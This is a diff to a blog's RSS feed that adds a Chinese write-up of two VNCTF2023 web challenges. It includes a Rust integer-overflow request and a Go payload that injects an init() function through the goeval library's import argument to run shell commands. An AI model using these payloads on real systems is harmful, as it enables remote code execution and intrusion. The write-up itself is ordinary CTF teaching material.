@@ -6,6 +6,537 @@
         <description>Recent content on k0a1i</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language><atom:link href="https://koali-www.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>VNCTF2023-Web</title>
+        <link>https://koali-www.github.io/2023/vnctf2023web/</link>
+        <pubDate>Wed, 01 Mar 2023 13:34:39 +0800</pubDate>
+        
+        <guid>https://koali-www.github.io/2023/vnctf2023web/</guid>
+        <description>&lt;h2 id=&#34;电子木鱼&#34;&gt;电子木鱼&lt;/h2&gt;
+&lt;p&gt;一道简单的rust但是好像和rust没有太大的关系。先来看看源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;use actix_files::Files;
+use actix_web::{
+    error, get, post,
+    web::{self, Json},
+    App, Error, HttpResponse, HttpServer,
+};
+use once_cell::sync::Lazy;
+use serde::{Deserialize, Serialize};
+use std::sync::{Arc, Mutex};
+use tera::{Context, Tera};
+
+static GONGDE: Lazy&amp;lt;ThreadLocker&amp;lt;i32&amp;gt;&amp;gt; = Lazy::new(|| ThreadLocker::from(0));
+
+#[derive(Debug, Clone, Default)]
+struct ThreadLocker&amp;lt;T&amp;gt; {
+    value: Arc&amp;lt;Mutex&amp;lt;T&amp;gt;&amp;gt;,
+}
+
+impl&amp;lt;T: Clone&amp;gt; ThreadLocker&amp;lt;T&amp;gt; {
+    fn get(&amp;amp;self) -&amp;gt; T {
+        let mutex = self.value.lock().unwrap();
+        mutex.clone()
+    }
+    fn set(&amp;amp;self, val: T) {
+        let mut mutex = self.value.lock().unwrap();
+        *mutex = val;
+    }
+    fn from(val: T) -&amp;gt; ThreadLocker&amp;lt;T&amp;gt; {
+        ThreadLocker::&amp;lt;T&amp;gt; {
+            value: Arc::new(Mutex::new(val)),
+        }
+    }
+}
+
+#[derive(Serialize)]
+struct APIResult {
+    success: bool,
+    message: &amp;amp;&#39;static str,
+}
+
+#[derive(Deserialize)]
+struct Info {
+    name: String,
+    quantity: i32,
+}
+
+#[derive(Debug, Copy, Clone, Serialize)]
+struct Payload {
+    name: &amp;amp;&#39;static str,
+    cost: i32,
+}
+
+const PAYLOADS: &amp;amp;[Payload] = &amp;amp;[
+    Payload {
+        name: &amp;quot;Cost&amp;quot;,
+        cost: 10,
+    },
+    Payload {
+        name: &amp;quot;Loan&amp;quot;,
+        cost: -1_000,
+    },
+    Payload {
+        name: &amp;quot;CCCCCost&amp;quot;,
+        cost: 500,
+    },
+    Payload {
+        name: &amp;quot;Donate&amp;quot;,
+        cost: 1,
+    },
+    Payload {
+        name: &amp;quot;Sleep&amp;quot;,
+        cost: 0,
+    },
+];
+
+#[get(&amp;quot;/&amp;quot;)]
+async fn index(tera: web::Data&amp;lt;Tera&amp;gt;) -&amp;gt; Result&amp;lt;HttpResponse, Error&amp;gt; {
+    let mut context = Context::new();
+
+    context.insert(&amp;quot;gongde&amp;quot;, &amp;amp;GONGDE.get());
+
+    if GONGDE.get() &amp;gt; 1_000_000_000 {
+        context.insert(
+            &amp;quot;flag&amp;quot;,
+            &amp;amp;std::env::var(&amp;quot;FLAG&amp;quot;).unwrap_or_else(|_| &amp;quot;flag{test_flag}&amp;quot;.to_string()),
+        );
+    }
+
+    match tera.render(&amp;quot;index.html&amp;quot;, &amp;amp;context) {
+        Ok(body) =&amp;gt; Ok(HttpResponse::Ok().body(body)),
+        Err(err) =&amp;gt; Err(error::ErrorInternalServerError(err)),
+    }
+}
+
+#[get(&amp;quot;/reset&amp;quot;)]
+async fn reset() -&amp;gt; Json&amp;lt;APIResult&amp;gt; {
+    GONGDE.set(0);
+    web::Json(APIResult {
+        success: true,
+        message: &amp;quot;重开成功，继续挑战佛祖吧&amp;quot;,
+    })
+}
+
+#[post(&amp;quot;/upgrade&amp;quot;)]
+async fn upgrade(body: web::Form&amp;lt;Info&amp;gt;) -&amp;gt; Json&amp;lt;APIResult&amp;gt; {
+    if GONGDE.get() &amp;lt; 0 {
+        return web::Json(APIResult {
+            success: false,
+            message: &amp;quot;功德都搞成负数了，佛祖对你很失望&amp;quot;,
+        });
+    }
+
+    if body.quantity &amp;lt;= 0 {
+        return web::Json(APIResult {
+            success: false,
+            message: &amp;quot;佛祖面前都敢作弊，真不怕遭报应啊&amp;quot;,
+        });
+    }
+
+    if let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) {
+        let mut cost = payload.cost;
+
+        if payload.name == &amp;quot;Donate&amp;quot; || payload.name == &amp;quot;Cost&amp;quot; {
+            cost *= body.quantity;
+        }
+
+        if GONGDE.get() &amp;lt; cost as i32 {
+            return web::Json(APIResult {
+                success: false,
+                message: &amp;quot;功德不足&amp;quot;,
+            });
+        }
+
+        if cost != 0 {
+            GONGDE.set(GONGDE.get() - cost as i32);
+        }
+
+        if payload.name == &amp;quot;Cost&amp;quot; {
+            return web::Json(APIResult {
+                success: true,
+                message: &amp;quot;小扣一手功德&amp;quot;,
+            });
+        } else if payload.name == &amp;quot;CCCCCost&amp;quot; {
+            return web::Json(APIResult {
+                success: true,
+                message: &amp;quot;功德都快扣没了，怎么睡得着的&amp;quot;,
+            });
+        } else if payload.name == &amp;quot;Loan&amp;quot; {
+            return web::Json(APIResult {
+                success: true,
+                message: &amp;quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&amp;quot;,
+            });
+        } else if payload.name == &amp;quot;Donate&amp;quot; {
+            return web::Json(APIResult {
+                success: true,
+                message: &amp;quot;好人有好报&amp;quot;,
+            });
+        } else if payload.name == &amp;quot;Sleep&amp;quot; {
+            return web::Json(APIResult {
+                success: true,
+                message: &amp;quot;这是什么？床，睡一下&amp;quot;,
+            });
+        }
+    }
+
+    web::Json(APIResult {
+        success: false,
+        message: &amp;quot;禁止开摆&amp;quot;,
+    })
+}
+
+#[actix_web::main]
+async fn main() -&amp;gt; std::io::Result&amp;lt;()&amp;gt; {
+    let port = std::env::var(&amp;quot;PORT&amp;quot;)
+        .unwrap_or_else(|_| &amp;quot;2333&amp;quot;.to_string())
+        .parse()
+        .expect(&amp;quot;Invalid PORT&amp;quot;);
+
+    println!(&amp;quot;Listening on 0.0.0.0:{}&amp;quot;, port);
+
+    HttpServer::new(move || {
+        let tera = match Tera::new(&amp;quot;src/templates/**/*.html&amp;quot;) {
+            Ok(t) =&amp;gt; t,
+            Err(e) =&amp;gt; {
+                println!(&amp;quot;Error: {}&amp;quot;, e);
+                ::std::process::exit(1);
+            }
+        };
+        App::new()
+            .app_data(web::Data::new(tera))
+            .service(Files::new(&amp;quot;/asset&amp;quot;, &amp;quot;src/templates/asset/&amp;quot;).prefer_utf8(true))
+            .service(index)
+            .service(upgrade)
+            .service(reset)
+    })
+    .bind((&amp;quot;0.0.0.0&amp;quot;, port))?
+    .run()
+    .await
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;审计完之后发现&lt;code&gt;GONGDE&lt;/code&gt;能够大于&lt;code&gt;1_000_000_000&lt;/code&gt;就给flag。关键代码在这里&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;if cost != 0 {
+    GONGDE.set(GONGDE.get() - cost as i32);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果能够让&lt;code&gt;cost&lt;/code&gt;成为一个大负数，就可以控制&lt;code&gt;GONGDE&lt;/code&gt;成为一个大正数。结合后面的&lt;code&gt;i32&lt;/code&gt;，可以想到整数溢出，所以现在的目的是让&lt;code&gt;cost&lt;/code&gt;足够大。&lt;/p&gt;
+&lt;p&gt;控制&lt;code&gt;cost&lt;/code&gt;的代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;if payload.name == &amp;quot;Donate&amp;quot; || payload.name == &amp;quot;Cost&amp;quot; {
+    cost *= body.quantity;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;quantity&lt;/code&gt;是我们传入的变量之一。那么当&lt;code&gt;quantity&lt;/code&gt;足够大时（比如大于2147283647），cost就会产生溢出。&lt;/p&gt;
+&lt;p&gt;因此最终传入&lt;code&gt;name=Cost&amp;amp;quantity=214748365&lt;/code&gt;时会使&lt;code&gt;cost&lt;/code&gt;溢出到&lt;code&gt;-2147483646&lt;/code&gt;，从而使&lt;code&gt;GONGDE&lt;/code&gt;成为较大的正数。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;这里注意，如果传入的&lt;code&gt;quantity=2147483648&lt;/code&gt;，也就是刚好大于i32时，服务器会返回&lt;code&gt;Parse error: number too large to fit in target type.&lt;/code&gt;参考下面的解释（大概）&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 314; 
+			flex-basis: 753px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/vnctf2023web/image-20230228100743212.png&#34; data-size=&#34;964x307&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/vnctf2023web/image-20230228100743212.png&#34;
+			width=&#34;964&#34;
+			height=&#34;307&#34;
+			srcset=&#34;https://koali-www.github.io/2023/vnctf2023web/image-20230228100743212_hu61d50c3b5d7e5cea037a858293193f06_48974_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/vnctf2023web/image-20230228100743212_hu61d50c3b5d7e5cea037a858293193f06_48974_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230228100743212&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230228100743212&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;babygo&#34;&gt;BabyGo&lt;/h2&gt;
+&lt;p&gt;简单的Go沙箱逃逸&lt;/p&gt;
+&lt;p&gt;看看源码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main
+
+import (
+	&amp;quot;encoding/gob&amp;quot;
+	&amp;quot;fmt&amp;quot;
+	&amp;quot;github.com/PaulXu-cn/goeval&amp;quot;
+	&amp;quot;github.com/duke-git/lancet/cryptor&amp;quot;
+	&amp;quot;github.com/duke-git/lancet/fileutil&amp;quot;
+	&amp;quot;github.com/duke-git/lancet/random&amp;quot;
+	&amp;quot;github.com/gin-contrib/sessions&amp;quot;
+	&amp;quot;github.com/gin-contrib/sessions/cookie&amp;quot;
+	&amp;quot;github.com/gin-gonic/gin&amp;quot;
+	&amp;quot;net/http&amp;quot;
+	&amp;quot;os&amp;quot;
+	&amp;quot;path/filepath&amp;quot;
+	&amp;quot;strings&amp;quot;
+)
+
+type User struct {
+	Name  string
+	Path  string
+	Power string
+}
+
+func main() {
+	r := gin.Default()
+	store := cookie.NewStore(random.RandBytes(16))
+	r.Use(sessions.Sessions(&amp;quot;session&amp;quot;, store))
+	r.LoadHTMLGlob(&amp;quot;template/*&amp;quot;)
+	
+	r.GET(&amp;quot;/&amp;quot;, func(c *gin.Context) {
+		userDir := &amp;quot;./&amp;quot; + cryptor.Md5String(c.ClientIP()+&amp;quot;VNCTF2023GoGoGo~&amp;quot;) + &amp;quot;/&amp;quot;
+		session := sessions.Default(c)
+		session.Set(&amp;quot;shallow&amp;quot;, userDir)
+		session.Save()
+		fileutil.CreateDir(userDir)
+		gobFile, _ := os.Create(userDir + &amp;quot;user.gob&amp;quot;)
+		user := User{Name: &amp;quot;ctfer&amp;quot;, Path: userDir, Power: &amp;quot;low&amp;quot;}
+		encoder := gob.NewEncoder(gobFile)
+		encoder.Encode(user)
+		if fileutil.IsExist(userDir) &amp;amp;&amp;amp; fileutil.IsExist(userDir+&amp;quot;user.gob&amp;quot;) {
+			c.HTML(200, &amp;quot;index.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: &amp;quot;Your path: &amp;quot; + userDir})
+			return
+		}
+		c.HTML(500, &amp;quot;index.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: &amp;quot;failed to make user dir&amp;quot;})
+	})
+
+	r.GET(&amp;quot;/upload&amp;quot;, func(c *gin.Context) {
+		c.HTML(200, &amp;quot;upload.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: &amp;quot;upload me!&amp;quot;})
+	})
+
+	r.POST(&amp;quot;/upload&amp;quot;, func(c *gin.Context) {
+		session := sessions.Default(c)
+		if session.Get(&amp;quot;shallow&amp;quot;) == nil {
+			c.Redirect(http.StatusFound, &amp;quot;/&amp;quot;)
+		}
+		userUploadDir := session.Get(&amp;quot;shallow&amp;quot;).(string) + &amp;quot;uploads/&amp;quot;
+		fileutil.CreateDir(userUploadDir)
+		file, err := c.FormFile(&amp;quot;file&amp;quot;)
+		if err != nil {
+			c.HTML(500, &amp;quot;upload.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: &amp;quot;no file upload&amp;quot;})
+			return
+		}
+		ext := file.Filename[strings.LastIndex(file.Filename, &amp;quot;.&amp;quot;):]
+		if ext == &amp;quot;.gob&amp;quot; || ext == &amp;quot;.go&amp;quot; {
+			c.HTML(500, &amp;quot;upload.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: &amp;quot;Hacker!&amp;quot;})
+			return
+		}
+		filename := userUploadDir + file.Filename
+		if fileutil.IsExist(filename) {
+			fileutil.RemoveFile(filename)
+		}
+		err = c.SaveUploadedFile(file, filename)
+		if err != nil {
+			c.HTML(500, &amp;quot;upload.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: &amp;quot;failed to save file&amp;quot;})
+			return
+		}
+		c.HTML(200, &amp;quot;upload.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: &amp;quot;file saved to &amp;quot; + filename})
+	})
+
+	r.GET(&amp;quot;/unzip&amp;quot;, func(c *gin.Context) {
+		session := sessions.Default(c)
+		if session.Get(&amp;quot;shallow&amp;quot;) == nil {
+			c.Redirect(http.StatusFound, &amp;quot;/&amp;quot;)
+		}
+		userUploadDir := session.Get(&amp;quot;shallow&amp;quot;).(string) + &amp;quot;uploads/&amp;quot;
+		files, _ := fileutil.ListFileNames(userUploadDir)
+		destPath := filepath.Clean(userUploadDir + c.Query(&amp;quot;path&amp;quot;))
+		for _, file := range files {
+			if fileutil.MiMeType(userUploadDir+file) == &amp;quot;application/zip&amp;quot; {
+				err := fileutil.UnZip(userUploadDir+file, destPath)
+				if err != nil {
+					c.HTML(200, &amp;quot;zip.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: &amp;quot;failed to unzip file&amp;quot;})
+					return
+				}
+				fileutil.RemoveFile(userUploadDir + file)
+			}
+		}
+		c.HTML(200, &amp;quot;zip.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: &amp;quot;success unzip&amp;quot;})
+	})
+
+	r.GET(&amp;quot;/backdoor&amp;quot;, func(c *gin.Context) {
+		session := sessions.Default(c)
+		if session.Get(&amp;quot;shallow&amp;quot;) == nil {
+			c.Redirect(http.StatusFound, &amp;quot;/&amp;quot;)
+		}
+		userDir := session.Get(&amp;quot;shallow&amp;quot;).(string)
+		if fileutil.IsExist(userDir + &amp;quot;user.gob&amp;quot;) {
+			file, _ := os.Open(userDir + &amp;quot;user.gob&amp;quot;)
+			decoder := gob.NewDecoder(file)
+			var ctfer User
+			decoder.Decode(&amp;amp;ctfer)
+			if ctfer.Power == &amp;quot;admin&amp;quot; {
+				eval, err := goeval.Eval(&amp;quot;&amp;quot;, &amp;quot;fmt.Println(\&amp;quot;Good\&amp;quot;)&amp;quot;, c.DefaultQuery(&amp;quot;pkg&amp;quot;, &amp;quot;fmt&amp;quot;))
+				if err != nil {
+					fmt.Println(err)
+				}
+				c.HTML(200, &amp;quot;backdoor.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: string(eval)})
+				return
+			} else {
+				c.HTML(200, &amp;quot;backdoor.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: &amp;quot;low power&amp;quot;})
+				return
+			}
+		} else {
+			c.HTML(500, &amp;quot;backdoor.html&amp;quot;, gin.H{&amp;quot;message&amp;quot;: &amp;quot;no such user gob&amp;quot;})
+			return
+		}
+	})
+
+	r.Run(&amp;quot;:80&amp;quot;)
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;具体思路是通过上传包含user.gob的zip压缩包，然后访问unzip让其解压到对应目录下面，最后通过访问backdoor，判断user.gob内含的user信息是否是admin，如果是admin就进入eval进行rce。&lt;/p&gt;
+&lt;h3 id=&#34;简单记录一下goeval的rce&#34;&gt;简单记录一下goeval的rce&lt;/h3&gt;
+&lt;p&gt;拿到goeval的源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package goeval
+
+import (
+	&amp;quot;fmt&amp;quot;
+	&amp;quot;go/format&amp;quot;
+	&amp;quot;math/rand&amp;quot;
+	&amp;quot;os&amp;quot;
+	&amp;quot;os/exec&amp;quot;
+	&amp;quot;strings&amp;quot;
+	&amp;quot;time&amp;quot;
+)
+
+const (
+	letterBytes = &amp;quot;abcdefghijklmnopqrstuvwxyz&amp;quot;
+	letterIdxBits = 6                    // 6 bits to represent a letter index
+	letterIdxMask = 1&amp;lt;&amp;lt;letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
+	letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
+)
+
+var (
+	dirSeparator = &amp;quot;/&amp;quot;
+	tempDir      = os.TempDir()
+	src          = rand.NewSource(time.Now().UnixNano())
+)
+
+// 参考： https://colobu.com/2018/09/02/generate-random-string-in-Go/
+func RandString(n int) string {
+	b := make([]byte, n)
+	// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
+	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i &amp;gt;= 0; {
+		if remain == 0 {
+			cache, remain = src.Int63(), letterIdxMax
+		}
+		if idx := int(cache &amp;amp; letterIdxMask); idx &amp;lt; len(letterBytes) {
+			b[i] = letterBytes[idx]
+			i--
+		}
+		cache &amp;gt;&amp;gt;= letterIdxBits
+		remain--
+	}
+	return string(b)
+}
+
+func Eval(defineCode string, code string, imports ...string) (re []byte, err error) {
+	var (
+		tmp = `package main
+%s
+%s
+func main() {
+%s
+}
+`
+		importStr string
+		fullCode string
+	 	newTmpDir = tempDir + dirSeparator + RandString(8)
+	)
+
+	if 0 &amp;lt; len(imports) {
+		importStr = &amp;quot;import (&amp;quot;
+		for _, item := range imports {
+			if blankInd := strings.Index(item, &amp;quot; &amp;quot;); -1 &amp;lt; blankInd {
+				importStr += fmt.Sprintf(&amp;quot;\n %s \&amp;quot;%s\&amp;quot;&amp;quot;, item[:blankInd], item[blankInd+1:])
+			} else {
+				importStr += fmt.Sprintf(&amp;quot;\n\&amp;quot;%s\&amp;quot;&amp;quot;, item)
+			}
+		}
+		importStr += &amp;quot;\n)&amp;quot;
+	}
+	fullCode = fmt.Sprintf(tmp, importStr, defineCode, code)
+
+	var codeBytes = []byte(fullCode)
+	// 格式化输出的代码
+	if formatCode, err := format.Source(codeBytes); nil == err {
+		// 格式化失败，就还是用 content 吧
+		codeBytes = formatCode
+	}
+
+	// 创建目录
+	if err = os.Mkdir(newTmpDir, os.ModePerm); nil != err {
+		return
+	}
+	defer os.RemoveAll(newTmpDir)
+	// 创建文件
+	tmpFile, err := os.Create(newTmpDir + dirSeparator + &amp;quot;main.go&amp;quot;)
+	if err != nil {
+		return re, err
+	}
+	defer os.Remove(tmpFile.Name())
+	// 代码写入文件
+	tmpFile.Write(codeBytes)
+	tmpFile.Close()
+	// 运行代码
+	cmd := exec.Command(&amp;quot;go&amp;quot;, &amp;quot;run&amp;quot;, tmpFile.Name())
+	res, err := cmd.CombinedOutput()
+	return res, err
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;关键代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;var (
+    tmp = `package main
+%s
+%s
+func main() {
+%s
+}
+`
+    importStr string
+    fullCode string
+    newTmpDir = tempDir + dirSeparator + RandString(8)
+)
+
+if 0 &amp;lt; len(imports) {
+    importStr = &amp;quot;import (&amp;quot;
+    for _, item := range imports {
+        // 碰到第一个空格就在它后面加双引号
+        if blankInd := strings.Index(item, &amp;quot; &amp;quot;); -1 &amp;lt; blankInd {
+            importStr += fmt.Sprintf(&amp;quot;\n %s \&amp;quot;%s\&amp;quot;&amp;quot;, item[:blankInd], item[blankInd+1:])
+        } else {
+            importStr += fmt.Sprintf(&amp;quot;\n\&amp;quot;%s\&amp;quot;&amp;quot;, item)
+        }
+    }
+    importStr += &amp;quot;\n)&amp;quot;
+}
+fullCode = fmt.Sprintf(tmp, importStr, defineCode, code)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里是将传入的参数拼接到tmp字符串中，生成一个完整的go文件。所以可以直接拼接代码进去实现rce。&lt;/p&gt;
+&lt;p&gt;构造可以执行系统命令的完整go文件：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main
+
+import (
+	&amp;quot;os/exec&amp;quot;
+	&amp;quot;fmt&amp;quot;
+)
+func init(){
+    cmd := exec.Command(&amp;quot;ls&amp;quot;,&amp;quot;/&amp;quot;)
+    res,err := cmd.CombinedOutput()
+    fmt.Println(string(res))
+    fmt.Println(err)
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;由于tmp里面已经有main函数，且函数执行的代码是我们不可控的，因此自行拼接一个init函数，让其在main函数之前被执行。同时为了闭合eval给出的引号，对这一段代码进行修改，给出如下exp：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;os/exec\&amp;quot;\n\&amp;quot;fmt\&amp;quot;)\nfunc\tinit(){\ncmd\t:=exec.Command(\&amp;quot;ls\&amp;quot;,\&amp;quot;/\&amp;quot;)\nres,err\t:=\tcmd.CombinedOutput()\nfmt.Println(string(res))\nfmt.Println(err)\n}\nconst(\nMessage=\&amp;quot;fmt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在web传参的时候记得url编码。&lt;/p&gt;
+&lt;h2 id=&#34;吐槽碎碎念&#34;&gt;吐槽&amp;amp;碎碎念&lt;/h2&gt;
+&lt;p&gt;rust环境真难装，装完发现用不到。&lt;/p&gt;
+&lt;p&gt;还有一道php据说很难就没做23333&lt;/p&gt;
+&lt;p&gt;最近太焦虑了，心又浮躁的很，在思考该怎么冷静下来&lt;/p&gt;
+&lt;p&gt;以及还是没有找到secret，崩溃.jpg&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Volatility踩坑日记</title>
         <link>https://koali-www.github.io/2023/volatilitydiary/</link>
         <pubDate>Sun, 12 Feb 2023 21:32:29 +0800</pubDate>
@@ -236,6 +767,7 @@ python2 vol.py -f memory.mem --profile=Win7SP1x64 # 指定镜像版本，方便�
 &lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; : 链接页、归档页样式更改&lt;/li&gt;
 &lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; : 添加一些小动画&lt;/li&gt;
 &lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; : 添加一下评论系统（应pyy的push要求）&lt;/li&gt;
+&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; : 重写about页面&lt;/li&gt;
 &lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; : 想到了再说&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id=&#34;记录一些四处搜刮来的文章&#34;&gt;记录一些四处搜刮来的文章&lt;/h3&gt;
